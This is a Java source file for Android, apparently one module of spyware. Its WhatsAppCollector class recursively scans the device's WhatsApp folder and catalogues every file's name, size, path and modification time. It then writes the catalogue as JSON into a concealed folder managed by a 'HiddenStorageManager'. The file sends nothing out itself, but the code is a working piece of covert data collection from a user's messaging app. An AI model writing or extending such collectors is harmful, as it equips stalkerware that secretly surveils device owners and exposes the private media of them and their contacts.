package com.alzahra.collectors;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import com.alzahra.storage.HiddenStorageManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;

public class WhatsAppCollector {
    
    private static final String TAG = "WhatsAppCollector";

    public static void collect(Context context) {
        try {
            JSONObject data = new JSONObject();
            JSONArray files = new JSONArray();
            
            File waDir;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                waDir = new File(context.getExternalFilesDir(null), "../WhatsApp");
            } else {
                waDir = new File(Environment.getExternalStorageDirectory(), "WhatsApp");
            }
            
            if (waDir.exists() && waDir.isDirectory()) {
                scanDirectory(waDir, files);
            }
            
            data.put("app", "whatsapp");
            data.put("timestamp", System.currentTimeMillis());
            data.put("path", waDir.getAbsolutePath());
            data.put("files_count", files.length());
            data.put("files", files);
            
            File outputFile = new File(HiddenStorageManager.getHiddenFolder(context), "whatsapp_data.json");
            FileOutputStream fos = new FileOutputStream(outputFile);
            fos.write(data.toString().getBytes());
            fos.close();
            
            Log.d(TAG, "Collected WhatsApp data: " + files.length() + " files");
            
        } catch (Exception e) {
            Log.e(TAG, "WhatsApp collection failed", e);
        }
    }
    
    private static void scanDirectory(File dir, JSONArray list) {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.isDirectory()) {
                scanDirectory(file, list);
            } else {
                try {
                    JSONObject obj = new JSONObject();
                    obj.put("name", file.getName());
                    obj.put("size", file.length());
                    obj.put("path", file.getAbsolutePath());
                    obj.put("modified", file.lastModified());
                    list.put(obj);
                } catch (Exception e) {}
            }
        }
    }
}
